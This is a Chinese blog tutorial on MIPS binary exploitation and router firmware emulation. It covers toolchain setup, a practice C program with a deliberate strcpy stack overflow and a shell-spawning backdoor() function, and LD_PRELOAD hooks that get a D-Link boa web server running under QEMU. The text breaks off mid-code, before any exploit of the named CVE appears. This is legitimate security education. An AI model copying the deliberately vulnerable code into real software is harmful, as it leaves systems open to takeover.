<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Mips 漏洞入门与分析（CVE-2020-8423） | Migraine殇</title><meta name="keywords" content="仍在学习的苦旅中"><meta name="author" content="Migraine殇"><meta name="copyright" content="Migraine殇"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Mips二进制漏洞入门笔记，最后调试TP-LINK路由器的一个栈溢出漏洞作为练习。">
<meta property="og:type" content="article">
<meta property="og:title" content="Mips 漏洞入门与分析（CVE-2020-8423）">
<meta property="og:url" content="https://migraine-sudo.github.io/2021/01/30/mips-pwn/index.html">
<meta property="og:site_name" content="Migraine殇">
<meta property="og:description" content="Mips二进制漏洞入门笔记，最后调试TP-LINK路由器的一个栈溢出漏洞作为练习。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://migraine-sudo.github.io/img/7GdBdp.jpg">
<meta property="article:published_time" content="2021-01-29T17:50:25.000Z">
<meta property="article:modified_time" content="2023-08-14T03:23:29.374Z">
<meta property="article:author" content="Migraine殇">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://migraine-sudo.github.io/img/7GdBdp.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://migraine-sudo.github.io/2021/01/30/mips-pwn/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="manifest" href="/manifest.json"/><link rel="apple-touch-icon" sizes="180x180" href="/images/icons/icon-512x512.png"/><link rel="icon" type="image/png" sizes="32x32" href="/images/icons/icon-512x512.png"/><link rel="icon" type="image/png" sizes="16x16" href="/images/icons/icon-512x512.png"/><link rel="mask-icon" href="/images/icons/icon-512x512.png" color="#5bbad5"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-08-14 11:23:29'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/%E6%88%88%E8%96%87.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/7GdBdp.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Migraine殇</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Mips 漏洞入门与分析（CVE-2020-8423）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-29T17:50:25.000Z" title="发表于 2021-01-30 01:50:25">2021-01-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-08-14T03:23:29.374Z" title="更新于 2023-08-14 11:23:29">2023-08-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Kernel-IOT/">Kernel/IOT</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><div class="note info flat"><p>本文首发于安全客自媒体，最终解释权归安全客所有。</p>
</div>

<p>Mips二进制漏洞入门笔记，最后调试TP-LINK路由器的一个栈溢出漏洞作为练习。</p>
<hr>
  <a id="more"></a>

<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3826">环境搭建</a></h2><div class="note primary modern"><p>搭建环境：Ubuntu16.04 in Parrallels</p>
</div>

<p><strong>工具安装</strong></p>
<p>SquashFS：用于Linux内核的只读文件系统</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev</span><br><span class="line">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;devttys0&#x2F;sasquatch</span><br><span class="line">cd sasquatch &amp;&amp; sudo .&#x2F;build</span><br></pre></td></tr></table></figure>
<p>Binwalk:貌似是目前唯一可靠的解bin包的工具。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install binwalk</span><br></pre></td></tr></table></figure>
<p>Ghidra:NAS开源的反汇编工具</p>
<p>安装java环境，直接运行ghidraRun.bat(Windows)或者ghidraRun(Linuxs &#x2F; Mac OS)，中途会要求jdk路径（&#x2F;usr&#x2F;libexec&#x2F;java_home -V 获取jdk路径）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;ghidraRun</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://www.ghidra-sre.org/">官网下载</a></p>
<p>简单体验了一下这个工具，比起IDA这个工具在函数和变量自动命名上更加有条理，并且反汇编和伪代码自动对应功能用起来也更方便。最重要的是可以反汇编Mips！</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/s3cz6B.png" alt="s3cz6B"></p>
<p><strong>环境安装</strong></p>
<p>Qemu安装</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu</span><br></pre></td></tr></table></figure>
<p>交叉编译环境buildroot</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libncurses5-dev patch</span><br><span class="line">wget http:&#x2F;&#x2F;buildroot.uclibc.org&#x2F;downloads&#x2F;snapshots&#x2F;buildroot-snapshot.tar.bz2</span><br><span class="line">tar -jxvf buildroot-snapshot.tar.bz2</span><br><span class="line">cd buildroot&#x2F;</span><br><span class="line">make clean</span><br><span class="line">make menuconfig</span><br><span class="line">sudo make</span><br></pre></td></tr></table></figure>
<p>进入menuconfig之后，选择目标架构Mips32（需要注意mips包含大端mips和小端mipsel）。配置结束之后使用make编译工具链即可。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202021-01-14%20%E4%B8%8B%E5%8D%883.36.49.png" alt="屏幕快照2021-01-14下午3.36.49"></p>
<p>安装完成之后设置环境变量，在&#x2F;etc&#x2F;profile结尾加上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH&#x3D;$PATH:&#x2F;...&#x2F;buildroot&#x2F;output&#x2F;host&#x2F;bin;</span><br></pre></td></tr></table></figure>
<p><strong>编译第一个mips程序</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span>&#123;</span><br><span class="line">     system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">has_stack</span><span class="params">(<span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> dst[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">     <span class="built_in">strcpy</span>(dst,src);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;copy successfully&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     has_stack(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>默认编译小端程序。注意需要加<code>-static</code><strong>静态编译</strong>，因为我们qemu运行环境并没有包含C标准库。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mipsel-linux-gcc vuln.c -o vuln -static</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> file vuln</span></span><br><span class="line">vuln: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped</span><br></pre></td></tr></table></figure>
<p>编译大端程序。需要加-EB参数，但是仅仅加-EB会导致ld报错，主要原因是ld也需要加-EB参数。所以我们需要编译和链接分开。如果要编译成共享库，上下加上-shared参数。（ld时还是存在问题）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mipsel-linux-gcc -EB -c -static  vuln.c -o vuln.o</span> </span><br><span class="line"><span class="meta">$</span><span class="bash"> mipsel-linux-ld vuln.o -EB -o vuln</span></span><br></pre></td></tr></table></figure>
<p>使用qemu-mipsel运行我们的小端程序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> qemu-mipsel vuln <span class="string">&quot;123&quot;</span></span></span><br><span class="line">copy successfully</span><br></pre></td></tr></table></figure>
<div class="note warning flat"><p>大端程序在链接时候出了问题</p>
</div>

<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/cev3ry.png" alt="cev3ry"></p>
<div class="note primary flat"><p>解决方案：用H4lo师傅的工具链构造mips<a target="_blank" rel="noopener" href="https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/cross_compile%E7%8E%AF%E5%A2%83">编译环境</a>,在里面找到了用apt就能直接安装的交叉编译工具链，以后也不用自己编译了！</p>
</div>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-libc-dev-mipsel-cross</span><br><span class="line">sudo apt-get install libc6-mipsel-cross libc6-dev-mipsel-cross</span><br><span class="line">sudo apt-get install binutils-mipsel-linux-gnu</span><br><span class="line">sudo apt-get install gcc-$&#123;VERSION&#125;-mipsel-linux-gnu g++-$&#123;VERSION&#125;-mips-linux-gnu</span><br></pre></td></tr></table></figure>
<p>用mips-linux-gnu-gcc编译大端程序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mips-linux-gnu-gcc vuln.c -o vuln -static</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> file vuln</span></span><br><span class="line">vuln: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a940ead4f05cbe960bbd685229c01695ef7cea38, not stripped</span><br></pre></td></tr></table></figure>
<p><strong>（*）Qemu运行Mips Linux内核</strong></p>
<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mips/">https://people.debian.org/~aurel32/qemu/mips/</a> 下载两个包</p>
<p>vmlinux内核文件和debian镜像（建议挂代理，否则很慢），建议使用3.2版本内核，老版本内核在gdbserver远程调试时会出现一些问题。并且请注意你下载的是mips还是mipsel版本。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta</span></span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/vmlinux-3.2.0-4-4kc-malta</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2</span><br></pre></td></tr></table></figure>
<p>使用qemu运行mips debian，账号和密码都是root。</p>
<p>Qemu有主要如下两种运作模式，User Mode和System Mode。</p>
<p>Qemu系统模式命令如下</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/uPic/MOeuOd.png" alt="MOeuOd"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="string">&quot;root=/dev/sda1 console=tty0&quot;</span> -net nic,macaddr=00:0c:29:ee:39:39 -net tap -nographic</span></span><br></pre></td></tr></table></figure>
<p><strong>调试路由器固件的运行环境</strong></p>
<p>测试固件版本：:DIR-605L A1 FW v1.13 <a target="_blank" rel="noopener" href="https://tsd.dlink.com.tw/ddgo">下载地址</a></p>
<p>首先用binwalk解包官网下载的固件DIR605LA1_FW113b06.bin</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e DIR605LA1_FW113b06.bin</span><br></pre></td></tr></table></figure>
<p>搜索boa（web服务程序）并且使用qemu-mips运行。首先复制qemu-mips到当前目录，然后用chroot设置根目录，然后用qemu-mips运行boa。不过出现了Not a direcotry的问题，这里需要用qemu-mips-static来运行。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cp $(<span class="built_in">which</span> qemu-mips) ./</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot qemu-mips ./squashfs-root-0/bin/boa</span></span><br><span class="line">chroot: cannot change root directory to &#x27;qemu-mips&#x27;: Not a directory</span><br><span class="line"></span><br><span class="line">安装qemu-mips-static</span><br><span class="line">sudo apt-get install qemu binfmt-support qemu-user-static</span><br><span class="line"></span><br><span class="line">改用qemu-mips-static运行</span><br><span class="line"><span class="meta">/squashfs-root-0$</span><span class="bash"> cp $(<span class="built_in">which</span> qemu-mips) ./</span></span><br><span class="line"><span class="meta">/squashfs-root-0$</span><span class="bash"> sudo chroot . ./qemu-mips-static ./bin/boa</span></span><br><span class="line">Initialize AP MIB failed!</span><br><span class="line">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>
<p>运行web服务的&#x2F;bin&#x2F;boa程序发生段错误，提示<code>Initialize AP MIB failed!</code></p>
<p>通过file文件和你想分析，我们可以知道boa文件动态链接到uclibc链接库，uclibc是应用于嵌入式设备的一种小型C运行库，free和malloc的实现和glibc有一定区别，利用手法也有一些不同，当然这是后话暂且不表。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file .&#x2F;bin&#x2F;boa</span><br><span class="line">.&#x2F;bin&#x2F;boa: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-uClibc.so.0, corrupted section header size</span><br></pre></td></tr></table></figure>
<p>在Ghidra中搜索<code>Initialize AP MIB failed!</code>,当apmid_init()执行失败了之后就会返回0，导致Web服务启动失败。经过分析apmid_init()来自于动态链接库apmid.so，来自文件根目录下的lib文件夹。又因为,apmid_init()对于我们的测试并没有决定性影响，所以可以考虑用hook的方式，强制让apmid_init()函数值返回1。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iVar1 = apmib_init();</span><br><span class="line"><span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Initialize AP MIB failed!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用<a target="_blank" rel="noopener" href="https://www.cnblogs.com/net66/p/5609026.html">LD_PRELOAD</a>来Hook函数，首先编写如下代码，并且编译成动态共享库。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">apmib_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hook apmib_init()\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mips-linux-gnu-gcc -Wall -fPIC -shared apmib.c -o apmib-ld.so</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-fPIC 作用于编译阶段，告诉编译器产生与位置无关代码(Position-Independent Code)，<br>则产生的代码中，没有绝对地址，全部使用相对地址，故而代码可以被加载器加载到内存的任意<br>位置，都可以正确的执行</p>
</blockquote>
<p>运行时设置环境变量LD_PRELOAD(优先加载)&#x3D;”&#x2F;apmib-ld.so”，但是运行又出了一点问题。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot ./ ./qemu-mips-static -E LD_PRELOAD=<span class="string">&quot;./apmib-ld.so&quot;</span> ./bin/boa</span></span><br><span class="line">./bin/boa: can&#x27;t load library &#x27;libc.so.6&#x27;</span><br></pre></td></tr></table></figure>
<p>默认链接库名为libc.so.6，所以我们这里尝试去复制uclibc的libc.so.0，再次运行，发现hook成功了。当然我发现使用LD_PRELOAD&#x3D;”libc.so.0”参数也可以解决问题。这里大家可以举一反三一下，思考如何将动态链接的mips elf（我们之前都是编译的静态链接程序）通过qemu的user mode运行起来？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cp lib&#x2F;libc.so.0 lib&#x2F;libc.so.6</span><br><span class="line">$ sudo chroot .&#x2F; .&#x2F;qemu-mips-static -E LD_PRELOAD&#x3D;&quot;.&#x2F;apmib-ld.so&quot; .&#x2F;bin&#x2F;boa</span><br><span class="line">hook apmib_init()</span><br><span class="line">Create chklist file error!</span><br><span class="line">Create chklist file error!</span><br><span class="line">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-mips-static -E LD_PRELOAD=&quot;./libc.so.0 ./apmib-ld.so&quot; ./bin/boa</span><br></pre></td></tr></table></figure>
<p>不过还是报了两个错，接下来只需要按照原理的思路，继续去分析，写出最终的链接库版本。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIB_IP_ADDR 170</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIB_HW_VER 0x250</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIB_CAPTCHA 0x2c1 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">apmib_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hook apmib_init()\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">apmib_get</span><span class="params">(<span class="keyword">int</span> code,<span class="keyword">int</span>* value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span>(code)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> MIB_HW_VER:</span><br><span class="line">			*value = <span class="number">0xF1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> MIB_IP_ADDR:</span><br><span class="line">			*value = <span class="number">0x7F000001</span>;</span><br><span class="line">			<span 